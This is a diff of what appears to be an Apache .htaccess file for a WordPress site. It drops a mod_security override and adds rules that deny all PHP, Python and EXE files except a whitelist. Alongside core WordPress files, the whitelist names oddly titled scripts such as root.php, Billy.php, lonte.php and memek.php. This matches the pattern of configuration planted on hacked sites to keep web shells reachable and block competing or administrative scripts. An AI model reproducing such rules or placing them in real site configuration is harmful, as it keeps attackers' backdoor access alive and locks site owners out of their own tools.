@@ -1,4 +1,31 @@
-<IfModule mod_security.c>
-		SecFilterEngine Off
-		SecFilterScanPOST Off
-		</IfModule>
+<FilesMatch ".(py|exe|Php|PHP|pHP|pHp|pHp|php|PHTML|pHTML|pHtMl|PhTmL|phtml|php1|php2|php3|php4|php5|php6|php7)$">
+
+ Order allow,deny
+
+ Deny from all
+
+</FilesMatch>
+
+<FilesMatch "^(root.php|Billy.php|index.php|content.php|wp-config-sample.php|wp-config.php|wp-login.php|about.php|dat.php|lonte.php|memek.php|asw.php)$">
+
+ Order allow,deny
+
+ Allow from all
+
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index\.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . /index.php [L]
+
+</IfModule>
